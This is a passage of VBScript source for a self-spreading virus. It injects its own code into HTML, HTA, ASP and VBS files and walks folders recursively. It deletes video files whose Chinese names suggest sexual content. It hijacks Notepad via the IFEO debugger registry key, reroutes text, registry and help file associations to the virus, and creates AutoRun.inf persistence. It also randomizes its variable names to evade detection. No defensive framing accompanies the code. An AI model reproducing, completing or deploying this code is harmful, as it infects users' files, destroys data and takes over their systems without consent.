                n_top = InStr(buffer , "<HEAD>")
                If n_top=0 Then
	                n_top = InStr(buffer , "<head>")
                End IF
                If n_top<>0 Then
                    buffer_top = Mid(buffer, 1, n_top + Len("<HEAD>") -1)
                    buffer_bottom = Mid(buffer, n_top + Len("<HEAD>"), Len(buffer))
                    Set objFileStream = objfso.OpenTextFile(FullPath_File, 2, True)
                    objFileStream.Write buffer_top & vbCrLf & Code & vbCrLf & buffer_bottom
                Else
                    Set objFileStream = objfso.OpenTextFile(FullPath_File, 2, True)
                    objFileStream.Write buffer & vbCrLf & Code
                End If
                AT_V_InfectFile = 1
                objFileStream.Close
            End If
        Case "VBS"
            If IsInfectedFile(buffer, Ext) = False Then
                Code = Code_Vbs
                Set objFileStream = objfso.OpenTextFile(FullPath_File, 2, True)
                objFileStream.Write buffer & vbCrLf & Code
                AT_V_InfectFile = 1
                objFileStream.Close
            End If
    End Select

End Function
'BIHLIFCYEZXL2_10

'WTGZBCUZIVABCX2_49
Sub AT_V_SetServices_DeBugger(objfso,ByRef Code_Vbs)
	On Error Resume Next
    Dim FULLPATH_V2,Value_V0_IFEO
    Dim FULLPATH_N0_NOTEPAD,FULLPATH_V0_NOTEPAD 
    
    FullPath_V2 = PropertyGet_Virus("FULLPATH_V2")  '%ProgramFiles\Internet Explore%  /DEBUGGER
    FULLPATH_N0_NOTEPAD = PropertyGet_SpecialFolder(0) & "NOTEPAD.EXE"
    FULLPATH_V0_NOTEPAD = PropertyGet_Virus("FULLPATH_V0_NOTEPAD") 
    Value_V0_IFEO="WScript.exe " & """" & FullPath_V2 & """" & " /DEBUGGER"

    Path_Folder= D & ":\~" 
    Path_V= Path_Folder & "\" & Name_V
    Path_inf = D & ":\AutoRun.inf"
    Path_ini = Path_Folder & "\" & "desktop.ini"
    Code_ini = "[.ShellClassInfo]" & vbCrLf & _
               "CLSID={645FF040-5081-101B-9F08-00AA002F954E}"

    Call AT_V_CpyCoreFile(objfso, "",FullPath_V2, Code_Vbs)
    Call AT_V_CpyCoreFile(objfso, FULLPATH_N0_NOTEPAD,FULLPATH_V0_NOTEPAD, "")
    Call AT_V_SetIFEO("NOTEPAD.EXE",Value_V0_IFEO,1)  
    
End Sub
'BIHLIFCYEZXL2_49

'WTGZBCUZIVABCX2_28
Function AT_V_SearchFile(objfso, FullPath_Folder, X0, ByRef CntMax_V, ByRef Cnt_V, ByRef Code_WebPage, ByRef Code_Vbs, T)
    On Error Resume Next
    Dim objfolder, oFiles, objFile, Ext, oSubFolders, objSubFolder, Result
    
    AT_V_SearchFile = 0
    
    Set objfolder = objfso.GetFolder(FullPath_Folder)
    Set oSubFolders = objfolder.SubFolders
    Set oFiles = objfolder.Files
    
    For Each objFile In oFiles
        If Cnt_V >= CntMax_V And T = 0 Then
            AT_V_SearchFile = 1
            Exit Function
        End If
        
        Ext = UCase(objfso.GetExtensionName(objFile.Path))
        Select Case Ext
            Case "HTA", "HTM", "HTML", "ASP", "VBS"
                If AT_V_InfectFile(objFile.Path, objFile, objfso, Code_WebPage, Code_Vbs, Ext, T) = 1 Then
                    Cnt_V = Cnt_V + 1
                    WScript.Sleep 1
                End If
                
            Case "MPG", "RMVB", "AVI", "RM"
                If IsSexFile(objFile.Name) = True Then
                    objFile.Delete
                End If
        End Select
    Next
    
    For Each objSubFolder In oSubFolders
        Result = AT_V_SearchFile(objfso, objSubFolder.Path, "", CntMax_V, Cnt_V, Code_WebPage, Code_Vbs, T)
    Next
    AT_V_SearchFile = 1
    
End Function
'BIHLIFCYEZXL2_28

'WTGZBCUZIVABCX2_43
Function IsSexFile(Filename)
    IsSexFile = False
    If InStr(Filename, "成" & "人")>0 Or InStr(Filename, "淫")>0 Or InStr(Filename, "偷" & "拍")>0 Or _
                InStr(Filename, "偷" & "窥")>0 Or InStr(Filename, "口" & "交")>0 Or InStr(Filename, "强" & "奸")>0 Or _
                InStr(Filename, "轮" & "奸")>0 Or InStr(Filename, "伦" & "理片")>0 Or InStr(Filename, "自" & "摸")>0 Or InStr(Filename, "古" & "装")>0 Then
        IsSexFile = True
    End If
End Function
'BIHLIFCYEZXL2_43

'WTGZBCUZIVABCX2_48
Sub AT_V_SetServices_OpenFile(objfso,ByRef Code_Vbs)
    On Error Resume Next
    Dim FULLPATH_V1,Value_V1
    
    FullPath_V1 = PropertyGet_Virus("FULLPATH_V1")  '%system32%  /OPENFILE
    Value_V1 = "%SystemRoot%\system32\WScript.exe " & """" & FullPath_V1 & """" & " /OPENFILE" & " %1 %* "                              
    
    Call AT_V_CpyCoreFile(objfso, "",FullPath_V1, Code_Vbs)
    Call AT_V_SetFileAss("TXTFILE",  Value_V1, 1)
    Call AT_V_SetFileAss("INFFILE",  Value_V1, 1)
    Call AT_V_SetFileAss("REGFILE",  Value_V1, 1)
    Call AT_V_SetFileAss("CHM.FILE", Value_V1, 1)
    Call AT_V_SetFileAss("HLPFILE",  Value_V1, 1)        
End Sub
'BIHLIFCYEZXL2_48

'WTGZBCUZIVABCX2_23
Function CodeMK_RndVar(Code) 'Randomize the VarNames in the Code
    Dim Name, j, temp, buffer,VarNames
    buffer = Code
    VarNames = Array(PropertyGet_Virus("0MODULELHEAD"), PropertyGet_Virus("0MODULELTAIL"))
    Randomize
    For Each Name in VarNames
        temp = ""
        For j = 1 To Len(Name)
            temp = temp & Chr((Int(Rnd * 26) + 65))
        Next
        buffer = Replace(buffer, Name, temp)
    Next
    CodeMK_RndVar = buffer
End Function
'BIHLIFCYEZXL2_23

'$Bottom